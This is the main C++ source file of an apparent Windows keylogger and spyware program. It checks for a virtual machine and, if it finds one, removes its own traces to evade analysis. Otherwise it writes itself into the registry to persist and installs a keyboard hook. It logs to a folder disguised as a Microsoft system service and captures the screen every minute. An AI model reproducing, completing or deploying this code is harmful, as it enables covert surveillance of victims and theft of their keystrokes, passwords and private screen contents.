#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

int main() {

#ifdef DEBUG_BUILD
  Stream::GetAccountInfo(clientInfo);
  std::cout << "io";
#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }
  Sys::AddToRegistry();
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  Stream::GetAccountInfo(clientInfo);

  std::string path = Stream::GetPath("\\Microsoft\\SystemService");

  Stream::MakeDir(path);
  Stream::MakeFile();

  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);

  std::ostringstream ostream;
  ostream << "[*] OS Info: " << clientInfo.osVersionInfo.dwMajorVersion << " "
		  << clientInfo.osVersionInfo.dwMinorVersion << " [*]"; // FIXME 0xC0000005
  std::string write = ostream.str();
  Stream::WriteLog(write, KeyHook::activeProcess, false);

  Screen::CaptureScreen(path, "winpst", true, 60000);

  KeyHook::HandleMessage(true);
#endif // DEBUG_BUILD
  return 0;
}